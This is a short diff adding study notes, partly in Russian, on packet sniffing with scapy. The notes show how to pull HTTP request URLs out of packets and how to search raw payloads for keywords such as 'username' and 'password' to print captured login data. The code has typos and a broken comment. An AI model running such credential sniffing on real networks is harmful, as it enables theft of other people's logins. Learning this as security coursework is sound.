@@ -64,5 +64,35 @@ FILTER  scapy
 		
 		
 -------------------
+LAYERS уровни
 
-		 
+		packet.show()
+		if packet.haslayer(http.HTTPRequest):
+			url = packet[http.HTTPRequest].Host + 
+				packet[http.HTTPRequest].Path
+
+		- Host = www.github.com
+		- Path = /lieblichka/42.git
+
+		priint(url)  # www.github.com/lieblichka/42.git
+
+
+
+LAYER RAW
+		
+		if packet.haslayer(scapy.Raw):
+			load = str(packet[scapy.Raw].load)
+			keywords = ["username", "user", "login", "password", "pass"]
+			for keyword in keywords:
+				if keyword in load:
+					print("\n\n[+] Possible username/password > " 
+						+ load + "\n\n")
+					break
+
+
+		load = str(packet[scapy.Raw].load) 
+			# переменная load содержит данные типа byte
+			поэтому необходимо применить приведение к строке,
+			чтобы можно было выполнить сравнение 
+		
+		keywords = ["usernameq q"]
